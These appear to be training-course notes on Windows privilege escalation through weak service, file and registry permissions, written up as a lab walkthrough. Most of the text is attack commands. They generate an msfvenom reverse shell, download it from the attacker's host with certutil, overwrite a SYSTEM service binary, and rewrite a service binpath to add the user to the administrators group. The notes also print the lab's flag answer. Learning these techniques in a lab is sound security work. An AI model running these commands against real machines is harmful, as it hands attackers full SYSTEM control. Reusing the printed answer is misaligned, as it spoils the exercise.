# NOTE — Weak Permissions

## ID
551

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 17 — Weak Permissions

## Description
Covers Windows privilege escalation via weak file system ACLs, weak service permissions, unquoted service paths, and permissive registry ACLs — all leading to SYSTEM-level execution.

## Tags
weak-permissions, service-hijacking, dll-hijacking, acl, privilege-escalation, windows

## Commands
- `SharpUp.exe audit`
- `icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"`
- `accesschk.exe /accepteula -quvcw <SERVICE_NAME>`
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > SecurityService.exe`
- `certutil.exe -f -urlcache http://<LHOST>:<LPORT>/SecurityService.exe SecurityService.exe`
- `cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"`
- `sc start SecurityService`
- `sc.exe config <SERVICE> binpath="cmd /c net localgroup administrators <USER> /add"`
- `wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`
- `accesschk.exe /accepteula "<USER>" -kvuqsw hklm\System\CurrentControlSet\services`

## What This Section Covers
Windows services often run as SYSTEM, so any misconfiguration in their permissions can lead to full system compromise. This section covers four categories of weak permissions: permissive file system ACLs on service binaries, weak service permissions allowing binpath modification, unquoted service paths enabling binary planting, and permissive registry ACLs on service keys. The lab exercise uses the modifiable service binary technique to replace a legitimate service executable with a reverse shell payload.

## Methodology

### Technique 1 — Modifiable Service Binaries (Lab Solution)
1. Run `SharpUp.exe audit` — look for **Modifiable Service Binaries** section
2. Confirm weak ACLs with `icacls` — look for `BUILTIN\Users:(I)(F)` or `Everyone:(I)(F)`
3. On Pwnbox, generate payload: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe > SecurityService.exe`
4. Host with `python3 -m http.server 8080`
5. On target, download: `certutil.exe -f -urlcache http://<IP>:8080/SecurityService.exe SecurityService.exe`
6. Replace the original: `cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"`
7. Start listener: `nc -lvnp 4444`
8. Start service: `sc start SecurityService`
9. Receive SYSTEM shell → `type C:\Users\Administrator\Desktop\WeakPerms\flag.txt`

### Technique 2 — Weak Service Permissions (binpath swap)
1. Run `SharpUp.exe audit` — look for **Modifiable Services** section
2. Confirm with `accesschk.exe /accepteula -quvcw <SERVICE>` — look for `SERVICE_ALL_ACCESS` for Authenticated Users
3. Change binpath: `sc.exe config <SERVICE> binpath="cmd /c net localgroup administrators <USER> /add"`
4. Stop and restart: `sc.exe stop <SERVICE>` then `sc.exe start <SERVICE>` (start will error — expected)
5. Verify: `net localgroup administrators`
6. Clean up: reset binpath to original exe, restart service

### Technique 3 — Unquoted Service Paths
1. Find unquoted paths: `wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`
2. Identify writable directories along the unquoted path
3. Drop a malicious exe at the first writable location Windows will try (e.g., `C:\Program Files (x86)\System.exe`)
4. Restart service or wait for reboot

### Technique 4 — Permissive Registry ACLs
1. Check registry ACLs: `accesschk.exe /accepteula "<USER>" -kvuqsw hklm\System\CurrentControlSet\services`
2. If KEY_ALL_ACCESS found, modify ImagePath: `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\<SVC> -Name "ImagePath" -Value "<PAYLOAD>"`
3. Restart service to execute payload

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — flag in WeakPerms folder on Admin Desktop | `Aud1t_th0se_s3rv1ce_p3rms!` | Replace SecurityService.exe (modifiable binary) with msfvenom reverse shell → `sc start SecurityService` → SYSTEM shell → `type` flag |

## Key Takeaways
- SharpUp distinguishes between **Modifiable Services** (can change config/binpath) and **Modifiable Service Binaries** (can overwrite the exe itself) — both are escalation paths but use different techniques.
- Services run as SYSTEM by default, so any service hijack gives you SYSTEM, not just local admin.
- Unquoted service paths are common to find but rarely exploitable — you need write access to a directory Windows tries before the correct path, and usually those directories require admin access anyway.
- `accesschk.exe` from Sysinternals is the go-to tool for checking both service permissions and registry ACLs.
- CVE-2019-1322 (UsoSvc) is a real-world example of weak service permissions allowing service accounts to escalate to SYSTEM.

## Gotchas
- In PowerShell, `sc` is an alias for `Set-Content` — always use `sc.exe` instead when working with services in PowerShell.
- The msfvenom payload architecture must match the target — use `windows/x64/shell_reverse_tcp` for 64-bit targets, not `windows/shell_reverse_tcp` (which is x86).
- When using the binpath swap technique, the `sc start` command will return an error (1053) because the binpath isn't a real service binary — the command still executes, don't panic.
- After exploiting weak service permissions, always clean up: reset binpath to the original exe and restart the service.
- `certutil.exe` is a reliable LOLBin for file transfers on Windows when `curl` isn't available or behaves unexpectedly.
